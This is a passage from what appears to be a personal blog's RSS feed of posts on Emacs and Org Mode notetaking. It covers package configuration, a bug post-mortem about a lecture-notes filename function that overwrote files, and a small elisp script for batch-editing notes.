Allows system and Emacs clipboard to communicate smoothly (both ways)
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">setq-default</span> select-enable-clipboard t) <span class="org-comment-delimiter">; </span><span class="org-comment">Merge system's and Emacs' clipboard</span>

</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orgf718eae" class="outline-3">
<h3 id="orgf718eae"><span class="section-number-3">4.3.</span> <a href="#orgf718eae">Org Mode</a></h3>
<div class="outline-text-3" id="text-4-3">
<p>
Automatically tangle org-mode files with the option <code>#+auto_tangle: t</code>
</p>
<div class="org-src-container">
<pre class="src src-elisp"><span class="org-comment-delimiter">; </span><span class="org-comment">Tangle org file when it is saved</span>
(<span class="org-keyword">use-package</span> org-auto-tangle     
    <span class="org-builtin">:hook</span> (org-mode . org-auto-tangle-mode))

</pre>
</div>

<p>
This is mind-breaking, allowing you to quickly insert images, handling
the file creation part. I use this with snippets, but it still is
<b>extremely powerful</b>.
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">use-package</span> org-download
  <span class="org-builtin">:config</span>
  (<span class="org-keyword">setq</span> org-download-heading-lvl nil)            <span class="org-comment-delimiter">;; </span><span class="org-comment">don't use headings when creating image names</span>
  (<span class="org-keyword">setq</span> org-download-timestamp <span class="org-string">"%Y%m%d_%H%M%S_"</span>) 
  (<span class="org-keyword">setq</span> org-download-screenshot-method <span class="org-string">"/user/local/bin/pngpaste %s"</span>)
  <span class="org-comment-delimiter">;; </span><span class="org-comment">Set the directory for storing images using :hook</span>
  <span class="org-builtin">:hook</span>
  (org-mode . (<span class="org-keyword">lambda</span> () (<span class="org-keyword">setq-local</span> org-download-image-dir <span class="org-string">"./images/"</span>))))
</pre>
</div>

<p>
And for references - bibliography management:
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">use-package</span> org-ref
  <span class="org-builtin">:config</span>
    (<span class="org-keyword">setq</span> org-ref-notes-directory <span class="org-string">"~/org"</span>)
    (<span class="org-keyword">setq</span> org-ref-bibliography-notes (expand-file-name <span class="org-string">"notes.org"</span> org-ref-notes-directory))
    (<span class="org-keyword">setq</span> org-ref-default-bibliography '(<span class="org-string">"/path/to/your.bib"</span>))
    (<span class="org-keyword">setq</span> bibtex-completion-bibliography org-ref-default-bibliography)
    (<span class="org-keyword">setq</span> bibtex-completion-notes-path org-ref-notes-directory)
    (<span class="org-keyword">setq</span> bibtex-autokey-name-case-convert-function 'capitalize)
    (<span class="org-keyword">setq</span> bibtex-autokey-name-year-separator <span class="org-string">""</span>)
    (<span class="org-keyword">setq</span> bibtex-autokey-titleword-length 5)
    (<span class="org-keyword">setq</span> bibtex-autokey-titleword-separator <span class="org-string">""</span>)
    (<span class="org-keyword">setq</span> bibtex-autokey-titlewords 2)
    (<span class="org-keyword">setq</span> bibtex-autokey-titlewords-stretch 1)
    (<span class="org-keyword">setq</span> bibtex-autokey-year-length 4)
    (<span class="org-keyword">setq</span> bibtex-autokey-year-title-separator <span class="org-string">""</span>)
    (<span class="org-keyword">setq</span> bibtex-completion-pdf-field <span class="org-string">"file"</span>)
    (<span class="org-keyword">setq</span> org-ref-default-ref-type <span class="org-string">"cref"</span>)
    (<span class="org-keyword">setq</span> bibtex-completion-pdf-open-function (<span class="org-keyword">lambda</span> (fpath) (start-process <span class="org-string">"open-pdf"</span> <span class="org-string">"*open-pdf*"</span> <span class="org-string">"open"</span> fpath)))
    (define-key bibtex-mode-map (kbd <span class="org-string">"H-b"</span>) 'org-ref-bibtex-hydra/body)
    (define-key org-mode-map (kbd <span class="org-string">"M-["</span>) 'org-ref-insert-link-hydra/body))
</pre>
</div>
<p>
Documents need to end with:
</p>
<div class="org-src-container">
<pre class="src src-text">**** References
&lt;&lt;bibliographystyle link&gt;&gt;

bibliographystyle:ieeetr

&lt;&lt;bibliography link&gt;&gt; bibliography:~/static/miref/master.bib
</pre>
</div>
</div>
</div>
<div id="outline-container-org8928364" class="outline-3">
<h3 id="org8928364"><span class="section-number-3">4.4.</span> <a href="#org8928364">Further suggestions</a></h3>
<div class="outline-text-3" id="text-4-4">
<ul class="org-ul">
<li>Snippets (<code>Yasnippets</code>): Cause we all want to write less and get more done</li>
<li><code>Vertico</code>: Revolutionizes the way you move around</li>
<li><code>Magit</code>: Git Integration</li>
<li><code>CDLaTeX</code>: Efficiently writing LaTeX in Org</li>
<li><code>Org-Roam</code>: An org-based obsidian-like solution</li>
<li><code>Deft</code>: If you are more into having lots of notes within one
directory - like using <code>nvim</code> with <code>ripgrep</code>.</li>
<li>Colorschemes / Aesthetically configuring your emacs instance: Now
this is purely subjective, but I use <code>nano</code>, with <code>nano-modeline</code>, but
there is no shortage of configurations online. Find one that works
for you.</li>
</ul>

<div class="note" id="orga4e9ce1">
<p>
I will try to publish my full emacs configuration some day in this
blog. Have a look at tags/emacs: Maybe I finally got to it.
</p>

</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
You can even make it execute in a remote server, yet I have not
played with that setting: <code>dir:  /&lt;server-dns&gt;:path</code>
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
If I remember correctly there is even an org to markdown conversion for
those that want to publish their sites with hugo and other
technologies :P
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Identifying a lethal mistake - after it happened: Notetaking Edition</title>
<link>posts/20230110_identifying_a_lethal_mistake_after_it_happened_notetaking_edition.html</link>
<pubDate>Tue, 10 Jan 2023 20:41:00 +0200</pubDate>
<guid>posts/20230110_identifying_a_lethal_mistake_after_it_happened_notetaking_edition.html</guid>
<description>
<![CDATA[<div id="outline-container-orgea6dfc5" class="outline-2">
<h2 id="orgea6dfc5"><span class="section-number-2">1.</span> <a href="#orgea6dfc5">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
For a while now I use my own implementation of a <i>notetaking</i> system to quickly
and efficiently create lecture notes, ready to be published, exported and
reviewed. All within Emacs.
</p>

<p>
This solution worked perfectly and I took huge pride in it. It allowed me to
focus on the lecture, utilizing only muscle memory to jot what was being taught
down and, since my touch-typing skills are on point, ensuring that I would have
quality material I could later study from.
</p>

<p>
It really worked.
Until it failed.
</p>

<p>
And today it failed again.
</p>
</div>
</div>
<div id="outline-container-org5f5d6f5" class="outline-2">
<h2 id="org5f5d6f5"><span class="section-number-2">2.</span> <a href="#org5f5d6f5">The story</a></h2>
<div class="outline-text-2" id="text-2">
<div class="note" id="orgd706961">
<p>
While writing the draft for this article I realized that this might have never
happened if I had published my configuration earlier. Anyone seeing the code
(even though I&rsquo;m not proud of its quality), might have seen this mistake&#x2026;
Moral of the story: I should write about my notetaking setup, detailing the
faulty parts and asking for criticism maybe&#x2026;
</p>

</div>

<p>
Sometime this Fall Semester (on a Monday), I was at my university, attending a
lecture on Stochastic Signals (you can see more about the course <a href="posts/lectures/auth/ssd/index.html">here</a>) when
suddenly my working file was corrupted and I lost everything I had written
till that point. Even my automatically generated backup files (which I had kept
active in my configuration for moments like these) could not help me. Something
mysterious had happened.
</p>

<p>
I could not understand what, but since the lecture was still going, I focused on
writing down what was left of it. Later, when it was over, I added as much as I
could remember, completing it (even though its quality could not be compared to
the original one).
</p>

<p>
Since I believed it was my error, I did not waste any time into trying to see
what went on. After all, the file was not corrupted in a way I could understand:
an empty file was just written on top of it, giving me the blank template I have
before adding content to a lecture.
</p>

<p>
Today, as I was watching Strang&rsquo;s wonderful <a href="https://www.youtube.com/watch?v=cdZnhQjJu4I&amp;ab_channel=MITOpenCourseWare">lecture on eigenvalues and
eigenvectors</a>, I stopped to go back to a previous one: I had forgotten how to
calculate the null space. I decided to create a reference for that lecture as
well, to avoid spending more time in the future to revisit the lecture: I can
visit my notes in a much more timely fashion. However, instead of visiting a new
file I &#x2026; lost my lecture notes at the blink of an eye.
</p>

<p>
And that is when I saw how naive I was when I wrote this little part of the code.
</p>
</div>
</div>
<div id="outline-container-orgf5bb778" class="outline-2">
<h2 id="orgf5bb778"><span class="section-number-2">3.</span> <a href="#orgf5bb778">The Doombringer</a></h2>
<div class="outline-text-2" id="text-3">
<p>
This is the function that I had originally created (and used till this day)
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/set-lectures-filename</span>(course)
  <span class="org-doc">"Returns the lecture's title in a format: lec_&lt;course&gt;_&lt;date&gt;.org"</span>
  (concat <span class="org-string">"lec_"</span> course  <span class="org-string">"_"</span> (format-time-string <span class="org-string">"%Y%m%d"</span>(current-time)) <span class="org-string">".org"</span>))
</pre>
</div>

<p>
The description was:
</p>
<blockquote>
<p>
Set the lecture&rsquo;s filename. I have experimented for a long time with this
function but i think that the &rsquo;lec_&lt;course&gt;_&lt;date&gt;.org&rsquo; is an ideal format.
</p>
</blockquote>

<p>
If you did not see what became so painfully apparent to me today: I do not check
whether this file exists (nor does the function the calls this one). I just
assume&#x2026; a lot of things.
</p>
</div>
</div>
<div id="outline-container-orgc27125b" class="outline-2">
<h2 id="orgc27125b"><span class="section-number-2">4.</span> <a href="#orgc27125b">Understanding my mistake</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Back when I created this function I hoped my files would get named like that :
 <code>lec_course_lecnumber_title.org</code>.
</p>

<p>
The thought that the <code>title</code> was unknown at the beginning of the lecture (at least
for the non-recorded ones) had not come to my mind and the <code>lecnumber</code>
implementation was equally problematic: I did not want to spend any more time in
designing the script, I wanted it to be functional and use it. However, my
implementations of <code>lecnumber</code> were at that point unacceptable, forcing me to
settle on a much simpler format: <code>lec_course_simpledate.org</code>
</p>

<p>
The only drawback with this format would be apparent only when I manually
visited the lectures directory, which was more than acceptable since I would
solely visit these files through my set of custom functions. Furthermore, since
my lecture files are plain-text even a simple bash snippet such as this one
could do the job:
</p>
<div class="org-src-container">
<pre class="src src-bash"><span class="org-keyword">for</span> i<span class="org-keyword"> in</span> lec_SSD*; <span class="org-keyword">do </span><span class="org-builtin">echo</span> $<span class="org-variable-name">i</span>; head -10 $<span class="org-variable-name">i</span> | grep <span class="org-string">'TITLE'</span>; <span class="org-keyword">done</span> 
</pre>
</div>

<p>
Additionally, I just that only one lecture per course would be created per day,
so it is completely unnecessary to implement checks, or add more information in
the file title to separate lecture files it from each other. After all, I wanted
to keep it minimal.
</p>

<div class="note" id="orgbfc2404">
<p>
<b>Free tip:</b> When you reach a point, even in scripts as simple as my notetaking
ones, where you can spend 5 minutes implementing a check, please do it, no
matter how silly it feels at the moment. I had it as a rule for myself, but
thought that, in this occasion, I could do without it. Look at me now: Writing
this article, after losing my notes.
</p>

</div>

<p>
It all becomes clear now: I either need to make it impossible for a lecture to
have the same filename as another lecture <b>or</b> to make sure that I check whether
the file exists.
</p>
</div>
</div>
<div id="outline-container-org13082b7" class="outline-2">
<h2 id="org13082b7"><span class="section-number-2">5.</span> <a href="#org13082b7">Implementing solutions</a></h2>
<div class="outline-text-2" id="text-5">
</div>
<div id="outline-container-orgb8a5fba" class="outline-3">
<h3 id="orgb8a5fba"><span class="section-number-3">5.1.</span> <a href="#orgb8a5fba">Impossible filename approach</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Extremely safe yet against my <i>simple-filenames</i> policy (keeping filenames as
simple and organized as possible to reduce visual clutter when manually visiting
these dirs)
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/set-lectures-filename</span>(course)
  <span class="org-doc">"Returns the lecture's title in a format: lec_&lt;course&gt;_&lt;date&gt;.org. "</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">This function was modified on &lt;2023-01-10 Tue&gt;, to fix a bug: I could not</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">start a second lecture for the same course on the same day without</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">overwriting the initial lecture</span>
    (concat <span class="org-string">"lec_"</span> course  <span class="org-string">"_"</span> (format-time-string <span class="org-string">"%Y%m%d_%H%M%S"</span>(current-time)) <span class="org-string">".org"</span>))
</pre>
</div>
</div>
</div>
<div id="outline-container-org228f053" class="outline-3">
<h3 id="org228f053"><span class="section-number-3">5.2.</span> <a href="#org228f053">Check for file approach</a></h3>
<div class="outline-text-3" id="text-5-2">
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/set-lectures-filename</span>(course)
  <span class="org-doc">"Returns the lecture's title in a format: lec_&lt;course&gt;_&lt;date&gt;.org. "</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">This function was modified on &lt;2023-01-10 Tue&gt;, to fix a bug: I could not</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">start a second lecture for the same course on the same day without</span>
    <span class="org-comment-delimiter">; </span><span class="org-comment">overwriting the initial lecture</span>
    (<span class="org-keyword">let*</span> ((filename (concat <span class="org-string">"lec_"</span> course  <span class="org-string">"_"</span> (format-time-string <span class="org-string">"%Y%m%d"</span>(current-time)) <span class="org-string">".org"</span>))
            (lecpath (expand-file-name filename (expand-file-name (concat <span class="org-string">"course_"</span> course) chatziiola/lectures-dir))))
        <span class="org-comment-delimiter">;; </span><span class="org-comment">If the file already exists</span>
        (<span class="org-keyword">if</span> (file-exists-p lecpath)
            (<span class="org-keyword">setq-local</span> filename (concat <span class="org-string">"lec_"</span> course  <span class="org-string">"_"</span> (format-time-string <span class="org-string">"%Y%m%d_%H%M%S"</span>(current-time)) <span class="org-string">"_"</span>
            <span class="org-comment-delimiter">;; </span><span class="org-comment">I use or so that I can always press enter there :P</span>
                (<span class="org-keyword">or</span> 
                    (read-string <span class="org-string">"A lecture already existed with this filename. Enter complementary information (empty appends hourminutesecond): "</span>)
                    (format-time-string <span class="org-string">"%H%M%S"</span>(current-time)))
                <span class="org-string">".org"</span>)))
    filename))
</pre>
</div>
</div>
</div>
<div id="outline-container-org02579c2" class="outline-3">
<h3 id="org02579c2"><span class="section-number-3">5.3.</span> <a href="#org02579c2">Selecting the proper one</a></h3>
<div class="outline-text-3" id="text-5-3">
<p>
I will keep the second one, mainly because of the fact that rarely will I need
the extra information that exists on the filename.
</p>

<p>
If anyone has a better solution though, I am always open to suggestions.
</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Build your script library</title>
<link>posts/20230208_spending_five_minutes_to_do_something_i_could_have_done_in_ten.html</link>
<pubDate>Wed, 08 Feb 2023 23:53:00 +0200</pubDate>
<guid>posts/20230208_spending_five_minutes_to_do_something_i_could_have_done_in_ten.html</guid>
<description>
<![CDATA[<div id="outline-container-org44ffb35" class="outline-2">
<h2 id="org44ffb35"><span class="section-number-2">1.</span> <a href="#org44ffb35">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<div class="note" id="orgab7cd40">
<p>
God, do I miss the non-exam period.
</p>

</div>
<p>
You know, we are often in the position of having to perform tedious tasks
repeatedly, yet fearing that by trying to automate we will lose more time, we&#x2026;
do the boring stuff.
</p>

<p>
In <i>Unix and Linux System Administration Handbook</i>, the authors suggest that
sysadmins do not fall into the trap of believing that automation is only for big
projects and that it requires elaborate planning.
</p>

<p>
Thinking of that section of the book, today, after not being able to sleep as
well as I&rsquo;d like the previous day, I gave this a shot. To my surprise, not only
did it work, but it was also (if I remember correctly) way more efficient, than
if I had done that by hand.
</p>
</div>
</div>
<div id="outline-container-org7aea832" class="outline-2">
<h2 id="org7aea832"><span class="section-number-2">2.</span> <a href="#org7aea832">In practice</a></h2>
<div class="outline-text-2" id="text-2">
<p>
The script is as simple as it gets, I just needed to replace a
property that was wrongly set in my notes. The fact that it is less
than 10 lines, is a consequence of the library of small scripts and
functions, which even though they may not be beautifully written, have
tremendous practical value.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">cl-loop</span> for file in (chatziiola/get-lecture-file-list <span class="org-string">"CCNA"</span>) do
         (message <span class="org-string">"Starting %s"</span> file)
         (<span class="org-keyword">with-current-buffer</span> (get-file-buffer file)
           (message <span class="org-string">"Inside the file"</span>)
           (goto-char (point-min))
           (<span class="org-keyword">if</span> (search-forward <span class="org-string">"A.U.Th"</span> nil t)
            (replace-match <span class="org-string">"CISCO"</span>)
            (message <span class="org-string">"Un-Successful search"</span>))
           )
         )

</pre>
</div>

<p>
In fact, with just a slight modification, this can turn into a function,
allowing me to use it in the future without losing time re-implementing it,
effectively solving the same <i>problem</i> again.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/correct-lecturefiles-course-property</span> course
  <span class="org-doc">"Fix the lectures' in COURSE, course property.</span>

<span class="org-doc">Get the property from the main (INFO) file of COURSE or, if that</span>
<span class="org-doc">is not set, replace current value with the default one"</span>
  (<span class="org-keyword">cl-loop</span> for file in (chatziiola/get-lecture-file-list course) do
           (<span class="org-keyword">with-current-buffer</span> (get-file-buffer file)
             (goto-char (point-min))
             <span class="org-comment-delimiter">;; </span><span class="org-comment">Actually this part needs to be modified to be used in a more</span>
             <span class="org-comment-delimiter">;; </span><span class="org-comment">generic environment, but for me this search is enough in 9 out</span>
             <span class="org-comment-delimiter">;; </span><span class="org-comment">of 10 times, and that is why i dont mess with a modification in</span>
             <span class="org-comment-delimiter">;; </span><span class="org-comment">the form of '#+course: .*\n'</span>
             (<span class="org-keyword">if</span> (search-forward <span class="org-string">"A.U.Th"</span> nil t)
                 <span class="org-comment-delimiter">;; </span><span class="org-comment">See how a small function from another time may go a long way? ;P</span>
                 (replace-match (chatziiola/get-lecture-institution course))
               (message <span class="org-string">"Un-Successful search in file: %s"</span> file)))
           )
  )
</pre>
</div>
</div>
</div>
<div id="outline-container-org2107805" class="outline-2">
<h2 id="org2107805"><span class="section-number-2">3.</span> <a href="#org2107805">Pretentiously offering suggestions</a></h2>
<div class="outline-text-2" id="text-3">
<p>
I have to make a couple of points here:
</p>
<ol class="org-ol">
<li><b>You do not always save time by writing a script.</b> You have to pick your
battles. If writing the script is sure to take some time and will not be used
often, making it hard to <i>get your time back</i>, it probably is a good idea to
deal with it manually. No one wants that but <i><b>sigh</b></i> time is limited</li>
<li><b>You can always win something by writing a script.</b> That <i>something</i> most of the
times is experience, which you will take advantage of when found in similar
situations. (This is more or less what I tell myself when a script took more
time than I had anticipated :P)</li>
<li><b>Use the right tool for the job - utilize existing infrastructure.</b> Once again,
the script above is rather simple, and I had opened a python file to write it
in, when I realized that writing it in elisp would most probably be a little
bit better for me, since I have some functions I could use. That decision
saved me some time. Imagine how much time one could save with an equivalent
decision in a much more complicated script.</li>
<li><b>Organize your scripts properly</b>. If they are not small functions that can be
grouped together, consider bundling them all by topic or by programming
language and creating a catalog, with a small description for each one.
Ironically this, usually, is the kind of job that we tried to avoid in the
first place, but in the long run it is definitely worth it.</li>
</ol>
</div>
</div>
<div id="outline-container-orge2f82eb" class="outline-2">
<h2 id="orge2f82eb"><span class="section-number-2">4.</span> <a href="#orge2f82eb">Summary</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Summing up, the thing is, that <i>Rome was not built in a day</i>. From my experience,
one needs to start building their script arsenal, keeping track of the problems
they have solved and in time, they will find that being able to utilize previous
work saves them much time.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>A practical note taking system</title>
<link>posts/20230309_a_practical_note_taking_system.html</link>
<pubDate>Thu, 09 Mar 2023 11:47:00 +0200</pubDate>
<guid>posts/20230309_a_practical_note_taking_system.html</guid>
<description>
<![CDATA[<div id="outline-container-org5492d89" class="outline-2">
<h2 id="org5492d89"><span class="section-number-2">1.</span> <a href="#org5492d89">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
My notetaking system has been a long on-going project. It started with
(<a href="#org3684e44">Castel 2023</a>), and has since been through a lot.
</p>

<div class="org-center">
<p>
From vim to emacs.
</p>


<p>
From \(\LaTeX\) to Org Mode.
</p>


<p>
From text only to inline images and complementary handwriting parts.
</p>
</div>

<p>
It evolved along with me, as I better understood my way to function, not solely
within an academic framework, but in general, and in this article, I will try to
properly describe its current form through my workflow.
</p>

<p>
Like most people that have lost enough time around note management and creation,
I got into this to improve an aspect of my workflow that I believed would be
worth optimizing. It was. Judging from my experience, though, falling into the
note taking rabbit hole is not for the faint of heart; if you start tinkering,
it will take some time to get back to writing without thinking about the process.
</p>

<p>
If you, however, have decided to not pay attention to this warning&#x2026; Prepare
yourselves!
</p>


<div class="note" id="orga4926e5">
<p>
If this article feels like its promoting my <i>note taking</i> stack, this was not
intended. My goal is to expose my process so that your feedback (supposing it
exists :P ) will allow me to see its problems(<a href="#orgf597d3d">Ahrens 2022</a>).
</p>

</div>
</div>
</div>
<div id="outline-container-orgf68464f" class="outline-2">
<h2 id="orgf68464f"><span class="section-number-2">2.</span> <a href="#orgf68464f">Before we begin</a></h2>
<div class="outline-text-2" id="text-2">
<p>
This article tries to avoid getting into the specifics of any of the well-known
note taking systems or configurations I may or may not have been inspired from.
I have tried to include many links, throughout this article, so that you can
begin your own journey
</p>

<p>
If it becomes too technical at times, I am sorry, but it was intended, with a
goal of achieving the same level of attention to detail as Castel. A goal that
is beyond my reach I suppose, yet &#x2026; I hope there is truth in the <i>aim for the
moon, even if you fail you&rsquo;ll be among the stars</i> mentality.
</p>
</div>
</div>
<div id="outline-container-org63e39b2" class="outline-2">
<h2 id="org63e39b2"><span class="section-number-2">3.</span> <a href="#org63e39b2">Introduction to note types</a></h2>
<div class="outline-text-2" id="text-3">
<p>
<b>Not all notes are the same.</b>
</p>

<p>
Notes should be created with a purpose in mind, and with a clear context in
which they would be accessed. Notes that you will read again and again because
they have a great detail of information on a difficult theoretical subject, and
help in research and in solidifying one&rsquo;s understanding are significantly
different to notes that aim to simplify that subject and the distinction becomes
even more apparent with notes that are supposed to be glanced at and help you
use a certain piece of software or methodology.
</p>

<p>
In my configuration there exist four distinct types of notes:
</p>
<ol class="org-ol">
<li><a href="#org21830a5">Working Notes</a></li>
<li><a href="#org6c55328">Lecture Notes</a></li>
<li><a href="#org18931a2">Book Notes</a></li>
<li><a href="#orgec37ecc">Permanent Notes</a></li>
</ol>

<p>
Each one of them would need a rather extensive article on the many phases that  
</p>

<div class="note" id="org516d604">
<p>
I feel that it is important to state that I also rely heavily on <code>org-capture</code> for
quick notes or <i>fleeting notes</i> as described in Zettelkasten
</p>

</div>
</div>
</div>
<div id="outline-container-org21830a5" class="outline-2">
<h2 id="org21830a5"><span class="section-number-2">4.</span> <a href="#org21830a5">Working Notes</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Working notes are, essentially, small chunks of important methodologies, tips
and commands I develop around a topic and keep within a keystrokes&rsquo; reach for
when I have trouble in that specific context.
</p>


<div id="orgd5afecf" class="figure">
<p><img src="posts/images/230309_1019_working-notes.png" alt="230309_1019_working-notes.png">
</p>
<p><span class="figure-number">Figure 1: </span>Here you can see some sample working notes on certain tools, managed by KLP</p>
</div>

<p>
Unlike the other types, working notes do not have a role in the learning
process. If anything, they are one of its handy products.
</p>

<p>
They are, however, indispensable in practicality. Building a little bit
on this, working notes, as a whole, are any user&rsquo;s <b>ideal</b> handbook. They can be
cheat sheets with a little bit of information, they can (and should) point to
resources you&rsquo;ll need when viewing that note, they can offer some simple
methodology tips, and much more, tailored specifically to you..
</p>

<p>
I have implemented working notes with my very first package, <a href="https://github.com/chatziiola/klp">KLP</a>. Using the
following configuration, everything works smoothly allowing me to access and
create working notes instantly.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">use-package</span> klp
  <span class="org-builtin">:straight</span>
  (<span class="org-builtin">:host</span> github <span class="org-builtin">:repo</span> <span class="org-string">"chatziiola/klp"</span>)

  <span class="org-builtin">:config</span>
  (<span class="org-keyword">setq</span> klp/static-notes-dir <span class="org-string">"~/my/path"</span>)

  <span class="org-builtin">:general</span>
  (lc/leader-keys
    <span class="org-string">"ln"</span> '(klp/open-note                   <span class="org-builtin">:which-keys</span> <span class="org-string">"Open tools cate"</span>)
    <span class="org-string">"lt"</span> '(chatziiola/open-thm-room        <span class="org-builtin">:which-keys</span> <span class="org-string">"Open thm categ"</span>)
    <span class="org-string">"lT"</span> '(chatziiola/open-tools           <span class="org-builtin">:which-keys</span> <span class="org-string">"Open tools cate"</span>))
  )
</pre>
</div>

<p>
To get a better understanding of how to use KLP, if you go that way, see the
following personalized functions:
</p>
<div class="org-src-container">
<pre class="src src-elisp">(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/open-tools</span> ()
<span class="org-doc">"Macro to use `</span><span class="org-doc"><span class="org-constant">klp/open-note</span></span><span class="org-doc">' to open all `</span><span class="org-doc"><span class="org-constant">notes_tool_title.org</span></span><span class="org-doc">' files."</span>
  (<span class="org-keyword">interactive</span>)
  (klp/open-note <span class="org-string">"tool"</span> '(<span class="org-string">"TITLE"</span>)))

(<span class="org-keyword">defun</span> <span class="org-function-name">chatziiola/open-thm-room</span> ()
<span class="org-doc">"Macro to use `</span><span class="org-doc"><span class="org-constant">klp/open-note</span></span><span class="org-doc">' to open all `</span><span class="org-doc"><span class="org-constant">notes_thm_title.org</span></span><span class="org-doc">' files."</span>
  (<span class="org-keyword">interactive</span>)
  (klp/open-note <span class="org-string">"thm"</span> '(<span class="org-string">"DATE"</span> <span class="org-string">"TITLE"</span>)))
</pre>
</div>
</div>
</div>
<div id="outline-container-org6c55328" class="outline-2">
<h2 id="org6c55328"><span class="section-number-2">5.</span> <a href="#org6c55328">Lecture Notes</a></h2>
<div class="outline-text-2" id="text-5">
<div class="note" id="org92016e9">
<p>
After having completed this article I noticed that I did not write about
<code>cdlatex</code>. If you use org heavily and would like to have inline \LaTeX, completion
and much more give it a shot.
</p>

</div>

<p>
I am a university undergrad, so quality lecture notes are of quite some
importance to me. In this context one cares about <i>quickly and efficiently</i>
jotting down what the professor(s) said, along with their fleeting thoughts, so
that they can be revised at a later time, allowing them to gain a deeper
understanding on the subject.
</p>

<p>
Unlike Castel, I have decided against spending time to configure a viable
solution for plotting while in lectures, even though I know such a system can be
impressively beneficial and quick. Instead what I have found to be a good, even
though not so classy approach, to this is using the inline-images functionality
that Org Mode offers to add photos from my phone, the Internet and from my own
handwritten sketches. This means that my lecture notes are initially image free
till I revisit them, but this is acceptable by me.
</p>

<p>
Examples of such images you can see in my published <a href="posts/lectures/index.html">posts/lectures/index.html</a>
</p>

<p>
Furthermore, lecture notes are almost identical to <a href="#org18931a2">book notes</a>, in their core.
The reason why there is a clear distinction between them in my configuration, is
a purely practical one. They do not work the same way, one uses <code>org-lectures</code>
while the other one uses <code>org-noter</code>, and they are used under different
circumstances. In lecture notes I strive for speed and completeness, so that I
can properly study on my own, while book notes do not have such strict time
constraints. In them, I want to be as thorough as possible, so that I can
distill the important information and gain a deep understanding of the subject.
</p>


<p>
As I described in the previous paragraph, for lecture notes I use my newly
published <a href="https://github.com/chatziiola/org-lectures">org-lectures</a> package, with the following simple configuration<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>.
</p>

<div class="org-src-container">
<pre class="src src-elisp">
(<span class="org-keyword">use-package</span> org-lectures
  <span class="org-builtin">:straight</span>
  (<span class="org-builtin">:host</span> github <span class="org-builtin">:repo</span> <span class="org-string">"chatziiola/org-lectures"</span>)
  <span class="org-builtin">:config</span>
  (<span class="org-keyword">setq</span> org-lectures-dir (expand-file-name <span class="org-string">"/my/path"</span>))
  (<span class="org-keyword">setq</span> org-lectures-static-course-files-dir  <span class="org-string">"/my/path"</span>)
  (<span class="org-keyword">setq</span> org-lectures-roam-id-integration  t)
  (<span class="org-keyword">setq</span> org-lectures-current-semester <span class="org-string">"6"</span>)
  <span class="org-builtin">:general</span>
  (lc/leader-keys
    <span class="org-string">"ll"</span> '(org-lectures-find-course             <span class="org-builtin">:which-keys</span> <span class="org-string">"lecture"</span>)
    <span class="org-string">"lF"</span> '(org-lectures-dired-course-folder     <span class="org-builtin">:which-keys</span> <span class="org-string">"Open course's folder"</span>))
  )
</pre>
</div>
</div>
</div>
<div id="outline-container-org18931a2" class="outline-2">
<h2 id="org18931a2"><span class="section-number-2">6.</span> <a href="#org18931a2">Book Notes</a></h2>
<div class="outline-text-2" id="text-6">
<p>
When reading a book, an article or even watching a video or a course, new ideas
will, naturally, emerge. These ideas can be simply fleeting notes, as they are
yours and only through development and elaboration can they be transformed
adequately to reside in your slip box, helping you in your research, however,
they can also be literature notes.
</p>


<p>
Zettelkasten method with the <i>keywords</i> <code>book</code> <code>article</code> <code>video</code>, contains ideas
expressed in that medium, obviously rephrased and handled according to Luhman&rsquo;s
technique.
</p>

<p>
TODO hint at bibliography and zotero
TODO hint at ebooks
</p>

<p>
Even though in the past I was a firm believer that regular books were superior
to ebooks and could not even be remotely compared, I have started, since I was
forced to study in electronic format for my university courses, to find many
areas in which ebooks have more to offer, without <i>practically</i> any drawback:
</p>
<ul class="org-ul">
<li>Easy references</li>
<li>Always with you</li>
</ul>
</div>
</div>
<div id="outline-container-orgec37ecc" class="outline-2">
<h2 id="orgec37ecc"><span class="section-number-2">7.</span> <a href="#orgec37ecc">Permanent Notes</a></h2>
<div class="outline-text-2" id="text-7">
<p>
These notes are stored as if they were to be published.  They are independent,
and thus do not rely on other notes to have meaning.
</p>

<p>
To be frank, I do not have much to say on my permanent notes. I use the
wonderful <code>org-roam</code> package, and I try to work along the lines of
(<a href="#orged04b20">“Org-Roam User Manual” 2023</a>), (<a href="#org49fd70d">Jethro 2023</a>), (<a href="#org3684e44">“Capturing Notes Efficiently with Org Roam - System Crafters” 2023</a>).
